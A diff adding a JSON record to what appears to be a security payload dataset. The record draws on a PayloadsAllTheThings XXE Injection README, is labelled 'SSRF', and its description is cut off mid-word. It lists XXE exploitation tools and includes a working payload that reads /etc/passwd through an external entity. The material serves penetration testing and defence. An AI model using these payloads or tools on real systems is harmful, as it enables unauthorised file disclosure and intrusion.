@@ -1,0 +1,27 @@
+{
+  "id": "ssrf-95cfd32a9fba",
+  "category": "SSRF",
+  "title": "README",
+  "description": "# XML External Entity\n\n> An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.\n\n## Summary\n\n- [Tools](#tools)\n- [Detect The Vulnerability](#detect-the-vulnerability)\n- [Exploiting XXE to Retrieve Files](#exploiting-xxe-to-retrieve-files)\n    - [Classic XXE](#classic-xxe)\n    - [Classic XXE Base64 Encoded](#classic-xxe-base64-encoded)\n    - [PH",
+  "payloads": [
+    "- [staaldraad/xxeftp](https://github.com/staaldraad/xxeserv) - A mini webserver with FTP support for XXE payloads",
+    "- [lc/230-OOB](https://github.com/lc/230-OOB) - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via [http://xxe.sh/](http://xxe.sh/)",
+    "- [enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector) - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods",
+    "- [BuffaloWill/oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)",
+    "- [whitel1st/docem](https://github.com/whitel1st/docem) - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc",
+    "- [bytehope/wwe](https://github.com/bytehope/wwe) - PoC tool (based on wrapwrap & lightyear ) to demonstrate XXE in PHP with only LIBXML_DTDLOAD or LIBXML_DTDATTR flag set",
+    "Syntax: `<!ENTITY entity_name \"entity_value\">`",
+    "Syntax: `<!ENTITY entity_name SYSTEM \"entity_value\">`",
+    "<!--?xml version=\"1.0\" ?-->",
+    "<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>",
+    "<userInfo>",
+    "<firstName>John</firstName>",
+    "<lastName>&example;</lastName>",
+    "</userInfo>",
+    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"
+  ],
+  "references": [
+    "PayloadsAllTheThings/XXE Injection/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
